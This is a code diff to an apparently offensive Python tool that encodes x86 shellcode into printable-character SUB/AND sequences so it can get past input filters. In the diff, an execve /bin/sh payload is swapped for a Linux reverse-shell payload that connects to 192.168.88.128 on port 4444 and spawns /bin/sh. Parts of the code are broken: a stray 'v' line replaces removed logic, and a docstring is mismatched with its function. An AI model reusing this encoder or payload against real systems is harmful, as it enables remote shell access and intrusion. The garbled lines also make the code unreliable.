@@ -108,7 +108,22 @@ def hex_print_end(dword):
     print("0x" + hex_dword)
     
 def build_byte_string(shellcode, format = "hex", chain = False):
+    """Take a string of shellcode and convert it into a byte string
 
+        This function takes a dword that has had it's char_list populated with characters
+        to reach the end value, it loops through each layer until it reaches the deepest point.
+    Args:
+        dword: a fully populated dword structure loaded with 4 bytes with values to be printed
+        output: an option argument, values are python for python/c compatible output or hex
+        no_heders: a boolean argument, used to remove printing of 
+        
+    Returns:
+        nothing, this function simply prints output
+        
+    TODO:
+        Modify to return a value, make function more extensible and flexible to allow printing more
+        opcodes.
+    """
     byte_string = []
     previous_dword = ['\x00', '\x00', '\x00', '\x00']
     y = 0
@@ -126,79 +141,168 @@ def build_byte_string(shellcode, format = "hex", chain = False):
            
             byte_string.append({'start_val':current_byte, 'end_val':previous_dword[y], 'depth':0, 'char_list': []})
             
-            if chain == True:
-                print("Chaining!")
-                previous_dword[y] = current_byte
-                y += 1
-                if y % 4 == 0:
-                    y = 0
+    v
                     
     if format == "python":
+        #print(len(shellcode))
+        shellcode = "\x83\xec\x60" + shellcode
         pad_count = len(shellcode) % 4
         shellcode += "\x90" * pad_count
 
         for current_byte in shellcode:
-            byte_string.append({'start_val':current_byte, 'end_val':previous_dword[y], 'depth':0, 'char_list': []})
-            if chain == True:
-                previous_dword[y] = current_byte
-                y += 1
-                if y % 4 == 0:
-                    y = 0
-    #print(byte_string)                
+            byte_string.append({'start_val':current_byte, 'end_val':'\x00', 'depth':0, 'char_list': []})
+        
+        if chain == True:
+            y = 3
+            for i in range(len(byte_string),0, -1):
+                #print("Using as start value" + hex(ord(previous_dword[y])))
+                #print("Goal value: " + hex(ord(byte_string[i-1]['start_val'])))
+                #print(i, end ="")
+                byte_string[i-1]['end_val'] = previous_dword[y]
+                previous_dword[y] = byte_string[i-1]['start_val']
+                y -= 1
+                if y == -1:
+                    y = 3
+    
     return byte_string
 
 
 def generate_shellcode(byte_string):
+    """ Takes a string of bytes, calculates end values and prints shellcode output
+
+        This function takes a bytestring which is a list of dictionaries, breaks it up into dwords
+        takes each of those dwords and generates the steps to reach the end value and prints the output
+        as shellcode.
+        
+    Args:
+        byte_string: a list of dictionaries that has been formatted to match our byte_string structure
+        
+    Returns:
+        nothing, this function simply prints output
+        
+    TODO:
+        Modify to return a value
+    """
+    # This is a temporary list to store 4 bytes extracted from our byte string
     dword = []
+    # Build and print our shellcode header
     build_shellcode_header('0xbffff72c','0xbffff600')
-    for i in range((len(byte_string)-2),0,-4):
+    # We need to work backwards through our list due to fact the stack grows upwards, we start at the end
+    # working backwards 4 bytes at a time
+    for i in range((len(byte_string)-1),0,-4):
+        #append 4 bytes to the dword starting with the last due to intels endianness
         dword.append(byte_string[i-3])
         dword.append(byte_string[i-2])
         dword.append(byte_string[i-1])
         dword.append(byte_string[i])
-        
-        #hex_print_end(dword)
+##        print("")        
+##        hex_print_end(dword)
+        # Encode our built dword
         encode_dword(dword)
-        #hex_print_start(dword)
-        #print("")
-        #hex_print(dword)
-        #print("")
+##        hex_print_start(dword)
+##        print("")
+##        hex_print(dword)
+##        print("")
         #input("")
+        # Print the generated values
         print_shellcode(dword, output = "python", chain = True)
+        # Reset the dword ready for the next 4 bytes of the byte_string
         dword.clear()
 
 def print_shellcode(dword, output = "python", chain = False, no_headers = False):
-    
+    """ Prints shellcode from our calculated dword
+
+        This function takes a dword that has had it's char_list populated with characters
+        to reach the end value, it loops through each layer until it reaches the deepest point.
+    Args:
+        dword: a fully populated dword structure loaded with 4 bytes with values to be printed
+        output: an option argument, values are python for python/c compatible output or hex
+        no_heders: a boolean argument, used to remove printing of 
+        
+    Returns:
+        nothing, this function simply prints output
+        
+    TODO:
+        Modify to return a value, make function more extensible and flexible to allow printing more
+        opcodes.
+    """
+    # The deepest point is used as a reference to know how many layers to print
     global GOAL_DEPTH
 
+    # The opcodes to clear the eax register
     clear_eax = "\\x25\\x25\\x25\\x25\\x25\\x25\\x42\\x42\\x42\\x42"
+    push_eax  = "\\x50"
+    #This variable will store our printable hex character
+    value = ''
+        
+    # If we are chaining to use the previous byte as the start_val of the previous result
+    # we do not need to clear eax each time we output the shellcode, we also provide the option
+    # of not printing eax each time
+    # Should this be moved out of the fucntion?
     if (chain == False and no_headers == False):
         #print("Clear")
         print(clear_eax, end="")
+    # Starting at 0 we loop through to the deepest point
     for i in range(0,GOAL_DEPTH):
+        # If we want python/c compatible output
         if output == "python":
+            #print the sub opcode
             print("\\x2d", end="")
+        # otherwise we print straight hex
         elif output == "hex":
             print("2d", end="")
-        value = ''
+        # work through each byte in the dword
         for byte in dword:
+            # This line takes the character stored at depth i of the byte, converts it into a hex character
+            # and takes a slice of it to remove the 0x leaving us with a printable hex string we can manipulate
             value = hex(ord(byte['char_list'][i]))[2:]
+            # if our desired output is python formatted we need to append \x 
             if(output == "python"):
                 value = "\\x" + value
             print(value, end="")
+    # once we have looped through all layers of the characters and built all sub statements, we need to
+    # print a push eax 
     if no_headers == False:
-        print("\\x50", end="")
+        print(push_eax, end="")
 
 def find_and(start_val, end_val):
+    """ Calculates two and values to get from start to end
+
+    WARNING THIS FUNCTION IS NOT FULLY IMPLEMENTED!!!
+    
+    This function takes a start value and using bitewise and attempts
+    to reach end val with only values in usable_chars.
+
+    e.g:
+        mov eax, 0x12345678
+        and eax, 0x25252525
+        -------------------
+        eax ==   0x00240420
+        and eax, 0x42424242
+        -------------------
+        eax ==   0x00000000
+    
+
+    Args:
+        start_val: The initial value of the inital byte
+        goal_mem: The goal value of the byte
+        
+    Returns:
+        A list of lists of pairs of characters that can be and'd
+
+    TODO:
+        Function is quite broken, currently in testing.
+    """
+    
     and_pair = []
     for char in usable_chars:
         for second_char in usable_chars:
             if (ord(char) & ord(second_char) == ord(end_val)):
                 and_pair.append([char, second_char])
 
-    print(hex(ord(and_pair[0][0])))
-    print(hex(ord(and_pair[0][1])))
-    print("Test")
+    #print(hex(ord(and_pair[0][0])))
+    #print(hex(ord(and_pair[0][1])))
+
 
 def build_shellcode_header(start_mem, goal_mem):
     """Creates and prints the first section of shellcode.
@@ -378,7 +482,7 @@ if __name__ == "__main__":
       - 0x735f5f25   (%__s)
         ----------
         0x8ca0a0db
-       - 0x7a6c4a63   (cJlz)
+      - 0x7a6c4a63   (cJlz)
         ----------
         0x12345678
      
@@ -402,11 +506,11 @@ if __name__ == "__main__":
 
     """
 
-    shellcode = '"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\x8d\x0c\x24\x8b\x54\x24\x04\xb0\x0b\xcd\x80"'
-
+    shellcode = "\x31\xdb\xf7\xe3\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xfe\xc3\x68\xc0\xa8\x58\x80\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x52\x89\xe1\xb0\x66\xfe\xc3\xcd\x80\x89\xd3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
+    
     byte_string = []
-    find_and('\x00','\x00')
-    byte_string = build_byte_string(shellcode, format = "python", chain = False)
+    # find_and('\x00','\x00')
+    byte_string = build_byte_string(shellcode, format = "python", chain = True)
     generate_shellcode(byte_string)
     #print(byte_string)
     
